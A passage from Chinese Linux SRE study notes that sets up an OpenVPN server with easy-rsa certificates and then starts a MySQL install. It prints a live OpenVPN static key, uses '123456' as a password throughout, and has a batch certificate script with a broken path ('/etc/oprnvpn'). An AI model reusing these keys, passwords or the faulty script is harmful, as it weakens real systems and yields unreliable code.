网络:liu-net1 交换机:liu-net1-sw1
公网IP 按量收费 10M 
默认安全组 默认配置 22,3389,icmp
centos8.2
系统盘 存储默认高效云盘40G
0.3元/小时 公网流量0.8元/G

3 创建局域网的服务器无公网IP的实例2个
按量付费
#服务器上配置一些东西
[root@web01 ~] ip地址：172.30.0.100/24
[root@web01 ~]# yum -y install httpd;hostname > /var/www/html/index.html;systemctl enable --now httpd;

[root@web02 ~] ip地址：172.30.0.200/24
[root@web02 ~]# yum -y install httpd;hostname > /var/www/html/index.html;systemctl enable --now httpd;
指定城市和可用区:华北3张家口可用区A区
共享型 2vCPU4G
centos7.9
系统盘 存储默认高效云盘40G
网络:liu-net1 mliu-net1-sw1
无公网IP
默认安全组
主网卡sw1

4 重设所有实例密码

5 修改安全组打开 1194/TCP/UDP

6.打通ssh-keygen验证
#这样就实现了三个主机相互之间免密登录
[root@web01 ~]# ssh-keygen
[root@web01 ~]# ssh-copy-id 127.0.0.1
[root@web01 ~]# rsync -av .ssh 172.30.0.200:/root/
[root@web01 ~]# rsync -av .ssh 172.30.0.1:/root/
```

**创建三台主机实例**

![1652952287552](linuxSRE.assets/1652952287552.png)

**创建专有网络和交换机**

![1652951381406](linuxSRE.assets/1652951381406.png)

**打开端口tcp/udp 1194**

![1652955319360](linuxSRE.assets/1652955319360.png)

### 34.2 安装OpenVPN

```
#1.安装OpenVPN和证书工具
[root@openvpn-server ~]# yum -y install openvpn easy-rsa

#2.生成服务器配置文件
[root@openvpn-server ~]# cp /usr/share/doc/openvpn-2.4.12/sample/sample-config-files/server.conf /etc/openvpn
[root@openvpn-server ~]# ll /etc/openvpn/
total 20
drwxr-x--- 2 root openvpn  4096 Mar 18 02:57 client
drwxr-x--- 2 root openvpn  4096 Mar 18 02:57 server
-rw-r--r-- 1 root root    10784 May 19 19:39 server.conf

#3.准备签发证书相关变量的配置文件
[root@openvpn-server ~]# cp -r /usr/share/easy-rsa/ /etc/openvpn/easy-rsa-server
[root@openvpn-server ~]# tree /etc/openvpn/
/etc/openvpn/
├── client
├── easy-rsa-server
│   ├── 3 -> 3.0.8
│   ├── 3.0 -> 3.0.8
│   └── 3.0.8
│       ├── easyrsa
│       ├── openssl-easyrsa.cnf
│       └── x509-types
│           ├── ca
│           ├── client
│           ├── code-signing
│           ├── COMMON
│           ├── email
│           ├── kdc
│           ├── server
│           └── serverClient
├── server
└── server.conf

7 directories, 11 files

#4.准备签发证书相关变量的配置文件
[root@openvpn-server ~]# cp /usr/share/doc/easy-rsa-3.0.8/vars.example /etc/openvpn/easy-rsa-server/3/vars
[root@openvpn-server ~]# vim /etc/openvpn/easy-rsa-server/3/vars
#CA的证书有效期默为为10年,可以适当延长,比如:36500天
set_var EASYRSA_CA_EXPIRE      36500
#服务器证书默为为825天,可适当加长,比如:3650天
set_var EASYRSA_CERT_EXPIRE    3650
[root@openvpn-server ~]# tree /etc/openvpn/
/etc/openvpn/
├── client
├── easy-rsa-server
│   ├── 3 -> 3.0.8
│   ├── 3.0 -> 3.0.8
│   └── 3.0.8
│       ├── easyrsa
│       ├── openssl-easyrsa.cnf
│       ├── vars
│       └── x509-types
│           ├── ca
│           ├── client
│           ├── code-signing
│           ├── COMMON
│           ├── email
│           ├── kdc
│           ├── server
│           └── serverClient
├── server
└── server.conf

7 directories, 12 file
```

### 34.3准备证书相关文件

```
[root@openvpn-server ~]# cd /etc/openvpn/easy-rsa-server/3/

#1.初始化数据,在当前目录下生成pki目录及相关文件
root@openvpn-server 3]# ./easyrsa init-pki
[root@openvpn-server 3]# tree
.
├── easyrsa
├── openssl-easyrsa.cnf
├── pki
│   ├── openssl-easyrsa.cnf
│   ├── private
│   ├── reqs
│   └── safessl-easyrsa.cnf
├── vars
└── x509-types
    ├── ca
    ├── client
    ├── code-signing
    ├── COMMON
    ├── email
    ├── kdc
    ├── server
    └── serverClient
4 directories, 13 files

#2.创建CA机构
[root@openvpn-server 3]# ./easyrsa build-ca nopass
一路回车就行

#3.创建服务端证书申请
[root@openvpn-server 3]# ./easyrsa gen-req server nopass
起名字为openvpn
Keypair and certificate request completed. Your files are:
req: /etc/openvpn/easy-rsa-server/3/pki/reqs/server.req          #生成请求文件
key: /etc/openvpn/easy-rsa-server/3/pki/private/server.key       #生成私钥文件

#4.颁发服务端证书
[root@openvpn-server 3]# ./easyrsa sign server server
Confirm request details: yes

#5.创建 Diffie-Hellman密钥
[root@openvpn-server 3]# ./easyrsa gen-dh
++*
DH parameters of size 2048 created at /etc/openvpn/easy-rsa-server/3/pki/dh.pem
[root@openvpn-server 3]# ll pki/dh.pem 
-rw------- 1 root root 424 May 19 20:24 pki/dh.pem
[root@openvpn-server 3]# cat pki/dh.pem 
-----BEGIN DH PARAMETERS-----
MIIBCAKCAQEAqoiQltaxm0vXlNGd0LXuNjQT3GD1g4K+uc1BdSkr03nBAeVHiCSb
b6fa5YCvs1iztiUZIZU0B9af93bdaGSkSa4YzSCSU0PqfpuEcQvO918byE4dSYAw
A4ax3zaRrgXNQ7wU9fjrnLaPkT++6WUj5lqW5iN2m/HbF0BjgOuzUMsncM/a4M8S
DMjbYjSOT9ADtt/bviz3BINS6RixIH02f9+iwTZ9I9BnRC+SmRHe9Q1R32AfuD+w
u8EbUyympFTv6BR7urlKy7P2odo5NBlgGwktXrC2Rp3BD80LMFwC0dc1hVxr8sbI
Wme03QKa1AwRVlwlCQ29vztFO2XfEWnrKwIBAg==
-----END DH PARAMETERS-----

#6.准备客户端证书环境
上面服务端证书配置完成，下面是配置客户端证书
[root@openvpn-server 3]# cp -r /usr/share/easy-rsa/ /etc/openvpn/easy-rsa-client
[root@openvpn-server 3]# cd /etc/openvpn/easy-rsa-client/3
[root@openvpn-server 3]# tree /etc/openvpn/easy-rsa-client
/etc/openvpn/easy-rsa-client
├── 3 -> 3.0.8
├── 3.0 -> 3.0.8
└── 3.0.8
    ├── easyrsa
    ├── openssl-easyrsa.cnf
    └── x509-types
        ├── ca
        ├── client
        ├── code-signing
        ├── COMMON
        ├── email
        ├── kdc
        ├── server
        └── serverClient
4 directories, 10 files
[root@openvpn-server 3]# cd /etc/openvpn//easy-rsa-client/3/
[root@openvpn-server 3]# pwd
/etc/openvpn/easy-rsa-client/3
[root@openvpn-server 3]# tree
.
├── easyrsa
├── openssl-easyrsa.cnf
└── x509-types
    ├── ca
    ├── client
    ├── code-signing
    ├── COMMON
    ├── email
    ├── kdc
    ├── server
    └── serverClient
1 directory, 10 files
[root@openvpn-server 3]# ./easyrsa init-pki
[root@openvpn-server 3]# tree
.
├── easyrsa
├── openssl-easyrsa.cnf
├── pki
│   ├── openssl-easyrsa.cnf
│   ├── private
│   ├── reqs
│   └── safessl-easyrsa.cnf
└── x509-types
    ├── ca
    ├── client
    ├── code-signing
    ├── COMMON
    ├── email
    ├── kdc
    ├── server
    └── serverClient
4 directories, 12 files


#7.生成客户端用户的证书申请
[root@openvpn-server 3]# ./easyrsa gen-req liusenbiao nopass #给出差在外的用户颁发证书
req: /etc/openvpn/easy-rsa-client/3/pki/reqs/liusenbiao.req
key: /etc/openvpn/easy-rsa-client/3/pki/private/liusenbiao.key

#8.签发客户端证书
#将客户端证书请求文件复制到CA的工作目录
[root@openvpn-server 3]# cd /etc/openvpn/easy-rsa-server/3/
[root@openvpn-server 3]# ./easyrsa import-req /etc/openvpn/easy-rsa-client//3/pki/reqs/liusenbiao.req liusenbiao
Note: using Easy-RSA configuration from: /etc/openvpn/easy-rsa-server/3.0.8/vars
Using SSL: openssl OpenSSL 1.0.2k-fips  26 Jan 2017
The request has been successfully imported with a short name of: liusenbiao
You may now use this name to perform signing operations on this request.
[root@openvpn-server 3]# vim vars
# In how many days should certificates expire?
set_var EASYRSA_CERT_EXPIRE     180 #员工证书过期的
#签发客户端证书
[root@openvpn-server 3]# ./easyrsa sign client liusenbiao

[root@openvpn-server 3]# bash /root/openvpn-user-crt.sh
如果需要颁发的客户端证书较多,可以使用下面脚本实现客户端证书的批量颁发
客户端证书自动颁发脚本
#!/bin/bash
#
#********************************************************************
#Author: liusenbiao
#QQ: 1805336068cd
#Date: 2022-5-19
#FileName： openvpn-user-crt.sh
#URL: http://www.liusenbiao.com
#Description： The test script
#Copyright (C): 2020 All rights reserved
#********************************************************************
read -p "请输入用户的姓名拼音(如:${NAME}): " NAME
cd /etc/openvpn/easy-rsa-client/3
./easyrsa gen-req ${NAME} nopass <<EOF

EOF

cd /etc/openvpn/easy-rsa-server/3
./easyrsa import-req /etc/openvpn/easy-rsa-client/3/pki/reqs/${NAME}.req ${NAME}


./easyrsa sign client ${NAME} <<EOF
yes
EOF
#查看给谁颁发的证书
[root@openvpn-server 3]# cat pki/index.txt
V	320516121852Z		CD6841B04445492E05B84A5A47FEA3ED	unknown	/CN=openvpn
V	221115133417Z		F7AAB72C34218A55C3121EC58A932A92	unknown	/CN=liusenbiao
V	221115134647Z		447EAE461451532B814EE4C5FC65FFE9	unknown	/CN=lujunhao


#9.将ca和服务器证书相关文件复制到服务器相应的目录
#实现证书的统一化管理
[root@openvpn-server 3]# mkdir /etc/openvpn/certs
[root@openvpn-server 3]# bash /root/openvpn_cp_certs.sh
#!/bin/bash
#
#********************************************************************
#Author: liusenbiao
#QQ: 1805336068
#Date: 2022-5-19
#FileName： openvpn-user-crt.sh
#URL: http://www.liusenbiao.com
#Description： The test script
#Copyright (C): 2020 All rights reserved
#********************************************************************
cd /etc/openvpn/easy-rsa-server/3
cp /etc/openvpn/easy-rsa-server/3/pki/ca.crt /etc/openvpn/certs/
cp /etc/openvpn/easy-rsa-server/3/pki/issued/server.crt /etc/openvpn/certs/
cp /etc/openvpn/easy-rsa-server/3/pki/private/server.key /etc/openvpn/certs/
cp /etc/openvpn/easy-rsa-server/3/pki/dh.pem /etc/openvpn/certs

[root@openvpn-server 3]# ll /etc/openvpn/certs/
total 20
-rw------- 1 root root 1176 May 19 22:04 ca.crt
-rw------- 1 root root  424 May 19 22:04 dh.pem
-rw------- 1 root root 4554 May 19 22:04 server.crt
-rw------- 1 root root 1704 May 19 22:04 server.key


#10.将客户端私钥与证书相关文件复制到服务器相关的目录
[root@openvpn-server 3]# mkdir /etc/openvpn/client/liusenbiao/
[root@openvpn-server 3]# find /etc/openvpn/ \( -name "liusenbiao.key" -o -name "liusenbiao.crt" -o -name ca.crt \) -exec cp {} /etc/openvpn/client/liusenbiao \;
[root@openvpn-server 3]# tree /etc/openvpn/client/liusenbiao/
/etc/openvpn/client/liusenbiao/
├── ca.crt
├── liusenbiao.crt
└── liusenbiao.key
0 directories, 3 files
```

### 34.4准备OpenVPN服务器配置文件

```
#0.服务器端配置文件说明
#server.conf文件中以#或;开头的行都为注释
[root@centos8 ~]#grep -Ev "^#|^$" /etc/openvpn/server.conf 
;local a.b.c.d  #本机监听IP,默认为本机所有IP
port 1194       #端口
;proto tcp      #协议,生产推荐使用TCP
proto udp #默认协议
;dev tap   #创建一个以太网隧道，以太网使用tap,一个tap设备允许完整的以太网帧通过Openvpn隧
道，可提供非ip协议的支持，比如IPX协议和AppleTalk协议,tap等同于一个以太网设备，它操作第二层数
据包如以太网数据帧。
dev tun    #创建一个路由IP隧道，生产推存使用tun.互联网使用tun,一个tun设备大多时候，被用于基
于IP协议的通讯。tun模拟了网络层设备，操作第三层数据包比如IP数据封包。
;dev-node MyTap  #TAP-Win32适配器。非windows不需要配置
ca ca.crt       #ca证书文件
cert server.crt  #服务器证书文件
key server.key   #服务器私钥文件
dh dh2048.pem    #dh参数文件
;topology subnet
server 10.8.0.0 255.255.255.0  #客户端连接后分配IP的地址池，服务器默认会占用第一个IP 
10.8.0.1将做为客户端的网关
ifconfig-pool-persist ipp.txt  #为客户端分配固定IP，不需要配置,建议注释
;server-bridge 10.8.0.4 255.255.255.0 10.8.0.50 10.8.0.100  #配置网桥模式，不需要配
置,建议注释
;server-bridge
;push "route 192.168.10.0 255.255.255.0"  #给客户端生成的到达服务器后面网段的静态路由，
下一跳为openvpn服务器的10.8.0.1
;push "route 192.168.20.0 255.255.255.0"  #推送路由信息到客户端，以允许客户端能够连接到
服务器背后的其它私有子网
;client-config-dir ccd #为指定的客户端添加路由，此路由通常是客户端后面的内网
网段而不是服务端的，也不需要设置
;route 192.168.40.128 255.255.255.248 
;client-config-dir ccd    
;route 10.9.0.0 255.255.255.252
;learn-address ./script                #运行外部脚本，创建不同组的iptables规则，无需配
置
;push "redirect-gateway def1 bypass-dhcp" #启用后，客户端所有流量都将通过VPN服务器，因
此生产一般无需配置此项
;push "dhcp-option DNS 208.67.222.222"   #推送DNS服务器，不需要配置
;push "dhcp-option DNS 208.67.220.220"
;client-to-client                       #允许不同的client直接通信,不安全,生产环境一般
无需要配置
;duplicate-cn                           #多个用户共用一个证书，一般用于测试环境，生产环
境都是一个用户一个证书,无需开启
keepalive 10 120         #设置服务端检测的间隔和超时时间，默认为每10秒ping一次，如果 120 
秒没有回应则认为对方已经down
tls-auth ta.key 0 #访止DoS等攻击的安全增强配置,可以使用以下命令来生成：openvpn --
genkey --secret ta.key #服务器和每个客户端都需要拥有该密钥的一个拷贝。第二个参数在服务器端应
该为’0’，在客户端应该为’1’
cipher AES-256-CBC  #加密算法
;compress lz4-v2    #启用Openvpn2.4.X新版压缩算法
;push "compress lz4-v2"   #推送客户端使用新版压缩算法,和下面的comp-lzo不要同时使用
;comp-lzo          #旧户端兼容的压缩配置，需要客户端配置开启压缩,openvpn2.4.X等新版可以不
用开启
;max-clients 100   #最大客户端数
;user nobody         #运行openvpn服务的用户和组
;group nobody
persist-key          #重启VPN服务时默认会重新读取key文件，开启此配置后保留使用第一次的key
文件,生产环境无需开启
persist-tun          #启用此配置后,当重启vpn服务时，一直保持tun或者tap设备是up的，否则会
先down然后再up,生产环境无需开启
status openvpn-status.log #openVPN状态记录文件，每分钟会记录一次
;log         openvpn.log   #第一种日志记录方式,并指定日志路径，log会在openvpn启动的时候
清空日志文件,不建议使用
;log-append openvpn.log   #第二种日志记录方式,并指定日志路径，重启openvpn后在之前的日志
后面追加新的日志,生产环境建议使用
verb 3                   #设置日志级别，0-9，级别越高记录的内容越详细,0 表示静默运行，只记
录致命错误,4 表示合理的常规用法,5 和 6 可以帮助调试连接错误。9 表示极度冗余，输出非常详细的日
志信息
;mute 20                 #相同类别的信息只有前20条会输出到日志文件中
explicit-exit-notify 1   #通知客户端，在服务端重启后自动重新连接，仅能用于udp模式，tcp模式
不需要配置即可实现断开重新连接,且开启此项后tcp配置后将导致openvpn服务无法启动,所以tcp时必须不
能开启此项


#1.修改服务器端配置文件
[root@openvpn-server 3]# vim /etc/openvpn/server.conf
port 1194
proto tcp
dev tun
ca /etc/openvpn/certs/ca.crt
cert /etc/openvpn/certs/server.crt
key /etc/openvpn/certs/server.key
dh /etc/openvpn/certs/dh.pem
server 10.8.0.0 255.255.255.0
push "route 172.30.0.0 255.255.255.0"
keepalive 10 120
cipher AES-256-CBC
compress lz4-v2
push "compress lz4-v2"
max-clients 2048
user openvpn
group openvpn
status /var/log/openvpn/openvpn-status.log
log-append /var/log/openvpn/openvpn.log
verb 3
mute 20
duplicate-cn #多个用户共享一个证书

#2.准备目志相关目录
[root@openvpn-server 3]# mkdir /var/log/openvpn
[root@openvpn-server 3]# chown openvpn.openvpn /var/log/openvpn
[root@openvpn-server 3]# ll -d /var/log/openvpn
drwxr-xr-x 2 openvpn openvpn 4096 May 19 22:30 /var/log/openvpn


#3.准备iptables规则和内核参数
#在服务器开启ip_forward转发功能
[root@openvpn-server 3]# echo net.ipv4.ip_forward = 1 >> /etc/sysctl.conf
[root@openvpn-server 3]# sysctl -p
#添加SNAT规则
[root@openvpn-server 3]# echo 'iptables -t nat -A POSTROUTING -s 10.8.0.0/24 -j MASQUERADE' >> /etc/rc.d/rc.local
[root@openvpn-server 3]# chmod +x /etc/rc.d/rc.local
[root@openvpn-server 3]# /etc/rc.d/rc.local
[root@openvpn-server 3]# iptables -vnL -t nat
Chain POSTROUTING (policy ACCEPT 26 packets, 4782 bytes)
 pkts bytes target     prot opt in     out     source               destination         
    0     0 MASQUERADE  all  --  *      *       10.8.0.0/24          0.0.0.0/0       


#4.启动OpenVPN服务
#centos7有/openvpn@.service文件，不需要创建
#centos8有/openvpn@.service文件，需要创建
[root@openvpn-server 3]# vim /usr/lib/systemd/system/openvpn@.service
[Unit]
Description=OpenVPN Robust And Highly Flexible Tunneling Application On %I
After=network.target

[Service]
Type=notify
PrivateTmp=true
ExecStart=/usr/sbin/openvpn --cd /etc/openvpn/ --config %i.conf

[Install]
WantedBy=multi-user.target
[root@openvpn-server ~]# systemctl daemon-reload
[root@openvpn-server ~]# systemctl enable --now openvpn@server
```

![1652975933963](linuxSRE.assets/1652975933963.png)

### 34.5准备OpenVPN客户端配置文件

```
#1.修改配置文件,内容如下
[root@openvpn-server ~]# vim /etc/openvpn/client/liusenbiao/client.ovpn
client
dev tun
proto tcp
remote 8.142.75.195 1194
resolv-retry infinite
nobind
#persist-key
#persist-tun
ca ca.crt
cert liusenbiao.crt
key liusenbiao.key
remote-cert-tls server
#tls-auth ta.key 1
cipher AES-256-CBC
verb 3 
compress lz4-v2
tls-auth ta.key 1
```

### 34.6Windows安装OpenVPN客户端

官方客户端下载地址：

https://openvpn.net/community-downloads/

![1652977354143](linuxSRE.assets/1652977354143.png)

保存证书到openvpn 客户端安装目录：D:\OpenVPN\config

```
[root@openvpn-server ~]# cd /etc/openvpn/client/liusenbiao/
[root@openvpn-server liusenbiao]# tar cf /root/liusenbiao.tar ./
tar: ./liusenbiao.tar: file is the archive; not dumped
[root@openvpn-server liusenbiao]# sz liusenbiao.tar
#解压，把里面的四个文件放到config里面
```

![1652979129866](linuxSRE.assets/1652979129866.png)

连接成功

![1653060400018](linuxSRE.assets/1653060400018.png)

**ping 172.30.0.200私有地址成功**

![1653060450349](linuxSRE.assets/1653060450349.png)

### 34.7OpenVPN 高级功能

#### 34.7.1防止DoS攻击

```
#1.启用防止DoS攻击的安全增强配置
[root@openvpn-server ~]# openvpn --genkey --secret /etc/openvpn/certs/ta.key
[root@openvpn-server ~]# ll /etc/openvpn/certs/
total 24
-rw------- 1 root root 1176 May 20 22:49 ca.crt
-rw------- 1 root root  424 May 20 22:49 dh.pem
-rw------- 1 root root 4554 May 20 22:49 server.crt
-rw------- 1 root root 1704 May 20 22:49 server.key
-rw------- 1 root root  636 May 20 23:31 ta.key
[root@openvpn-server ~]# cat /etc/openvpn/certs/ta.key 
#
# 2048 bit OpenVPN static key
#
-----BEGIN OpenVPN Static key V1-----
02bbd533a6a8db5383ea9f96b034dc4c
d8cb364e9b4dffae6699ab03935f41be
f35f493040b02396874ca662eb3fbcdd
4ad6bfb9ee68b27c30becc33e491e6fa
7bdc0949c15c40d0be1157929a9d1bad
9d0d3e1d4b4346036d9589b62e567e32
c46e883de7ebfd7bf8954f7c58735904
9df59e05d8b907e297131e60c71888ab
8c2a61842398fcff648831c40ce8bc44
6a31c17fe8d95811cef3bb55cda9ef0e
fc3a1bb3285076eb6a91459616236699
83512f6a30232d06fa4fa017427143d9
f07e349485cbf72036dec90262b3026a
65deadd17306236dfb5dab5ac0b7bc9a
3944f7e42bcb8a7471f3b6ea00894737
f2ad1f073b71a64d074076787a9173f4
-----END OpenVPN Static key V1-----
[root@openvpn-server ~]# vim /etc/openvpn/server.conf
tls-auth /etc/openvpn/certs/ta.key 0  #客户端为1,服务器端为0
[root@openvpn-server ~]# systemctl restart openvpn@server.service
#windows客户端上修改openvpn的配置文件
tls-auth ta.key 1 #加上这行
[root@openvpn-server ~]# sz /etc/openvpn/certs/ta.key
ta.key文件拷贝到桌面，并放到D:\OpenVPN\config下
```

#### 34.7.2设置私钥密码

```
#2.1创建新用户,生成对应的有密码的私钥和证书申请
[root@openvpn-server ~]# cd /etc/openvpn/easy-rsa-client/3
[root@openvpn-server 3]# pwd
/etc/openvpn/easy-rsa-client/3
[root@openvpn-server 3]# ./easyrsa gen-req magedu
输入密码123456
[root@openvpn-server 3]# tree pki
pki
├── openssl-easyrsa.cnf
├── private
│   ├── liusenbiao.key
│   ├── lujunhao.key
│   └── magedu.key #创建新用户
├── reqs
│   ├── liusenbiao.req
│   ├── lujunhao.req
│   └── magedu.req #创建新用户
└── safessl-easyrsa.cnf
2 directories, 8 files

#2.2 导入证书申请并颁发证书
[root@openvpn-server 3]# cd /etc/openvpn/easy-rsa-server/3
[root@openvpn-server 3]# ./easyrsa import-req /etc/openvpn/easy-rsa-client/3/pki/reqs/magedu.req   magedu
ki/reqs/magedu.req   magedu
Using SSL: openssl OpenSSL 1.0.2k-fips  26 Jan 2017

The request has been successfully imported with a short name of:  
You may now use this name to perform signing operations on this request
[root@openvpn-server 3]# pwd
/etc/openvpn/easy-rsa-server/3
[root@openvpn-server 3]# vim vars
#把新人magedu的有效期改成30天
set_var EASYRSA_CERT_EXPIRE     30
#颁发证书
[root@openvpn-server 3]# ./easyrsa sign client magedu
[root@openvpn-server 3]# cat /etc/openvpn/easy-rsa-server/3/pki/index.txt
V	320517143446Z		D918B038F74C2677CE800EE2A67FE491	unknown	/CN=openvpn
V	320517144343Z		41B1DB8DC4812A1EF8BF8B07080F3E9C	unknown	/CN=liusenbiao
V	320517144842Z		E338471FBAC309EDC0528A8B12432A62	unknown	/CN=lujunhao
V	320518023518Z		1ED9BCE39731AC5E0EB8CACD9979DF01	unknown	/CN=magedu #新创建带有私钥密码的用户


#2.3 将用户的证书相关文件放在指定的目录中
[root@openvpn-server 3]# mkdir /etc/openvpn/client/magedu
[root@openvpn-server 3]# cp /etc/openvpn/easy-rsa-client/3/pki/private/magedu.key /etc/openvpn/client/magedu
[root@openvpn-server 3]# cp /etc/openvpn/certs/{ca.crt,dh.pem,ta.key} /etc/openvpn/client/magedu/
[root@openvpn-server 3]# cp /etc/openvpn/client/liusenbiao/client.ovpn /etc/openvpn/client/magedu/
[root@openvpn-server 3]# cp /etc/openvpn/easy-rsa-server/3/pki/issued/magedu.crt /etc/openvpn/client/magedu
[root@openvpn-server 3]# ls /etc/openvpn/client/magedu/
ca.crt  client.ovpn  dh.pem  magedu.crt  magedu.key  ta.key
[root@openvpn-server 3]# vim /etc/openvpn/client/magedu/client.ovpn
client
dev tun
proto tcp
remote 8.142.75.195 1194
resolv-retry infinite
nobind
ca ca.crt
cert magedu.crt
key magedu.key
remote-cert-tls server
cipher AES-256-CBC
verb 3
compress lz4-v2
tls-auth ta.key 1
[root@openvpn-server 3]# cd /etc/openvpn/client/magedu/
[root@openvpn-server magedu]# zip -e /root/magedu.zip ./*
Enter password: 
Verify password: 
  adding: ca.crt (deflated 26%)
  adding: client.ovpn (deflated 25%)
  adding: dh.pem (deflated 18%)
  adding: magedu.crt (deflated 45%)
  adding: magedu.key (deflated 24%)
  adding: ta.key (deflated 40%)
[root@openvpn-server magedu]# sz /root/magedu.zip
上传到桌面然后把里面的文件全部拷贝到windows下的/openVPN/config下
```

![1653103303588](linuxSRE.assets/1653103303588.png)

验证加密密钥是否成功

密码123456

![1653103349257](linuxSRE.assets/1653103349257.png)

加密成功

![1653103397495](linuxSRE.assets/1653103397495.png)

![1653103708495](linuxSRE.assets/1653103708495.png)

#### 34.7.3 证书自动过期吊销

```
#3.1 证书自动过期
[root@openvpn-server magedu]# date
Sat May 21 11:47:25 CST 2022
[root@openvpn-server magedu]# date -s '10 year'
Fri May 21 11:47:43 CST 2032
[root@openvpn-server magedu]# date
Fri May 21 11:47:55 CST 2032
[root@openvpn-server magedu]# clock -s #恢复成硬件时间
[root@openvpn-server magedu]# date
Sat May 21 11:48:56 CST 2022


#3.2 吊销指定的用户的证书
[root@openvpn-server magedu]# cd /etc/openvpn/easy-rsa-server/3
[root@openvpn-server 3]# cat pki/index.txt
V	320517143446Z		D918B038F74C2677CE800EE2A67FE491	unknown	/CN=openvpn
V	320517144343Z		41B1DB8DC4812A1EF8BF8B07080F3E9C	unknown	/CN=liusenbiao
V	320517144842Z		E338471FBAC309EDC0528A8B12432A62	unknown	/CN=lujunhao
V	320518023518Z		1ED9BCE39731AC5E0EB8CACD9979DF01	unknown	/CN=magedu
[root@openvpn-server 3]# ./easyrsa revoke magedu #吊销证书
[root@openvpn-server 3]# cat pki/index.txt
R	320518023518Z	220521035416Z	1ED9BCE39731AC5E0EB8CACD9979DF01     unknown	/CN=magedu    #R表示吊销证书


#3.3 生成证书吊销列表
#每次吊销证书后都需要更新证书吊销列表文件,并且需要重启OpenVPN服务
[root@openvpn-server magedu]# cd /etc/openvpn/easy-rsa-server/3
[root@openvpn-server 3]# ./easyrsa gen-crl


#3.4将吊销列表文件发布
#第一次吊销证时需要编辑配置文件调用吊销证书的文件,后续吊销无需此步
[root@openvpn-server 3]# vim /etc/openvpn/server.conf
#加上下面这一行
crl-verify /etc/openvpn/easy-rsa-server/3/pki/crl.pem
[root@openvpn-server 3]# !syst
systemctl restart openvpn@server.service

```

#### 34.7.4账户重名证书签发

```
假如公司已有员工叫magedu已经离职,且证书已被吊销，现在又新来一个员工仍叫magedu，那么一般的区分办法是在用户名后面加数字，如:magedu1、magedu2等，假如还想使用magedu这个账户名签
发证书的话，那么需要删除服务器之前magedu的账户，并删除签发记录和证书，否则新用户的证书无法导入，并重新颁发证书

# 自动化的证书颁发脚本
#!/bin/bash
#
#********************************************************************
#Author: liusenbiao
#QQ: 1805336068
#Date: 2022-5-19
#FileName： openvpn-user-crt.sh
#URL: http://www.liusenbiao.com
#Description： The test script
#Copyright (C): 2020 All rights reserved
#********************************************************************
. /etc/init.d/functions

OPENVPN_SERVER=8.142.75.195
PASS=123456

remove_cert() {
    touch heman.txt
    rm -rf /etc/openvpn/client/${NAME}
    find /etc/openvpn/ -name "$NAME.*" -delete
}

create_cert() {
    cd /etc/openvpn/easy-rsa-client/3
   ./easyrsa gen-req ${NAME} nopass <<EOF

EOF
    cd /etc/oprnvpn/easy-rsa-server/3
   ./easyrsa import-req /etc/openvpn/easy-rsa-client/3/pki/reqs/${NAME}.req ${NAME}
   ./easyrsa sign client ${NAME} <<EOF
yes
EOF
    mkdir /etc/openvpn/client/${NAME}
    cp /etc/openvpn/easy-rsa-server/3/pki/issued/${NAME}.crt /etc/openvpn/client/${NAME}
    cp /etc/openvpn/easy-rsa-client/3/pki/private/${NAME}.key /etc/openvpn/client/${NAME}
    cp /etc/openvpn/certs/{ca.crt,dh.pem,ta.key} /etc/openvpn/client/${NAME}
    cat > /etc/openvpn/client/${NAME}/client.ovpn <<EOF
client
dev tun
proto tcp
remote ${OPENVPN_SERVER} 1194
resolv-retry infinite
nobind
#persist-key
#persist-tun
ca ca.crt
cert $NAME.crt
key $NAME.key
remote-cert-tls server
tls-auth ta.key 1
cipher AES-256-CBC
verb 3
compress lz4-v2
EOF
    echo "证书存放路径:/etc/openvpn/client/${NAME},证书文件如下:"
    echo -e "\E[1;32m******************************************************************\E[0m"
    ls -l /etc/openvpn/client/${NAME}
    echo -e "\E[1;32m******************************************************************\E[0m"
    cd /etc/openvpn/client/${NAME}
    zip -qP "$PASS" /root/${NAME}.zip *
    action  "证书的打包文件已生成: /root/${NAME}.zip"
}   


read -p "请输入用户的姓名拼音(如:liusenbiao): " NAME

remove_cert
create_cert

[root@openvpn-server ~]# bash /root/openvpn-user-crt.sh
[root@openvpn-server ~]# sz /root/xiaohua
然后到windows下的openvpn/config端配置下即可!!!
```

### 34.8生产中常用配置文件

```
#server端配置文件
[root@openvpn-server 3]# vim /etc/openvpn/server.conf
port 1194
proto tcp
dev tun
ca /etc/openvpn/certs/ca.crt
cert /etc/openvpn/certs/server.crt
key /etc/openvpn/certs/server.key  # This file should be kept secret
dh /etc/openvpn/certs/dh.pem
server 10.8.0.0 255.255.255.0
push "route 172.30.0.0 255.255.0.0"
keepalive 10 120
tls-auth /etc/openvpn/certs/ta.key 0
cipher AES-256-CBC
compress lz4-v2
push "compress lz4-v2"
max-clients 2048
user openvpn
group openvpn
status /var/log/openvpn/openvpn-status.log
log-append /var/log/openvpn/openvpn.log
verb 3
mute 200
crl-verify /etc/openvpn/easy-rsa-server/3/pki/crl.pem


# client端配置文件
vim /etc/openvpn/client/liusenbiao/client.ovpn
client
dev tun
proto tcp
remote 10.0.0.8 1194
resolv-retry infinite
nobind
#persist-key
#persist-tun
ca ca.crt
cert magedu.crt
key magedu.key
remote-cert-tls server
tls-auth ta.key 1
cipher AES-256-CBC
verb 3
compress lz4-v2
```

## 35.MYSQL数据库

### 35.1mysql的安装

#### 35.1.1普通安装

```
#centos7安装
[21:22:51 root@centos7 ~]#yum -y install mariadb-server
#初始化密码等其他安全信息
[21:22:51 root@centos7 ~]#mysql_secure_installation
[09:30:36 root@centos7 ~]#mysqladmin -uroot -pliusenbiao password 123456   #修改密码


#centos8安装
[root@centos8 ~]# yum -y install mysql-server
#初始化密码等其他安全信息
[root@centos8 ~]# mysql_secure_installation
#修改配置文件
#持久修改mysql提示符
[root@centos8 ~]# cd /etc/my.cnf.d/
[root@centos8 my.cnf.d]# ls
client.cnf  mysql-default-authentication-plugin.cnf  mysql-server.cnf
[root@centos8 my.cnf.d]# vim mysql.cnf
[mysql]
prompt="\\r:\\m:\\s(\\u@\\h) [\\d]>\\_"
#最后mysql的效果
09:44:44(root@localhost) [mysql]> 


#ubuntu安装
[root@ubuntu1804]# sudo apt install mysql-server
#初始化密码等其他安全信息
[root@ubuntu1804]# mysql_secure_installation 
```

#### 35.1.2二进制安装

##### 35.1.2.1一键安装mysql-5.6

```
#1.离线安装mysql-5.6
#!/bin/bash
DIR=`pwd`
NAME="mysql-5.6.47-linux-glibc2.12-x86_64.tar.gz"
FULL_NAME=${DIR}/${NAME}
DATA_DIR="/data/mysql"

yum install -y libaio perl-Data-Dumper  
if [ -f ${FULL_NAME} ];then
    echo "安装文件存在"
else
